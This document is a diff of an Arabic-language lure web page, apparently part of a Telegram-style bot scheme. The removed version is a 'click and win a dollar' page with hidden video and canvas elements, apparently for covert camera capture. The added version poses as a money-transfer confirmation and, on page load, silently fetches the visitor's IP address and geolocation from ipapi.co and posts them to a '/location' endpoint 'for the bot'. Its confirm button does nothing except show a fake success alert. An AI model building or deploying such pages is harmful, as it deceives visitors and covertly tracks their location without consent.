@@ -1,55 +1,60 @@
-
 <!DOCTYPE html>
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>اضغط واربح دولار</title>
+  <title>تأكيد التحويل</title>
   <style>
     body {
-      margin: 0;
-      padding: 0;
+      background-color: #f2f2f2;
+      font-family: Tahoma, sans-serif;
       text-align: center;
-      background: url('../static/win_background.jpg') no-repeat center center fixed;
-      background-size: cover;
-      font-family: Arial, sans-serif;
-      color: #fff;
+      padding: 50px;
     }
-    #overlay {
-      position: absolute;
-      top:0; left:0; right:0; bottom:0;
-      backdrop-filter: blur(5px);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
+    .card {
+      background-color: #ffffff;
+      border-radius: 10px;
+      padding: 40px;
+      max-width: 400px;
+      margin: auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
-    #countdown {
-      font-size: 100px;
-      display: none;
-    }
-    #video {
-      display: none;
-    }
-    #captureBtn {
-      padding: 20px 40px;
-      font-size: 24px;
-      background: #28a745;
+    .btn {
+      background-color: #2aabee;
+      color: white;
+      padding: 15px 25px;
       border: none;
-      border-radius: 8px;
+      border-radius: 5px;
+      font-size: 18px;
       cursor: pointer;
+      margin-top: 20px;
+    }
+    .btn:hover {
+      background-color: #1a8bd4;
     }
   </style>
 </head>
 <body>
-  <div id="overlay">
-    <h1>اضغط واربح دولار كل نص ساعة</h1>
-    <button id="captureBtn">اضغط الآن</button>
-    <div id="countdown"></div>
+  <div class="card">
+    <h2>تأكيد تحويل الأموال</h2>
+    <p>يرجى الضغط على الزر لتأكيد استلام التحويل إلى محفظتك.</p>
+    <button class="btn" onclick="confirmClick()">تأكيد التحويل</button>
   </div>
 
-  <video id="video" width="320" height="240" autoplay></video>
-  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+  <script>
+    // إرسال IP والموقع للبوت
+    fetch("https://ipapi.co/json/")
+      .then(res => res.json())
+      .then(data => {
+        fetch('/location', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify(data)
+        });
+      });
 
-<script src="../static/script.js"></script>
+    function confirmClick() {
+      alert("تم تأكيد التحويل");
+    }
+  </script>
 </body>
 </html>
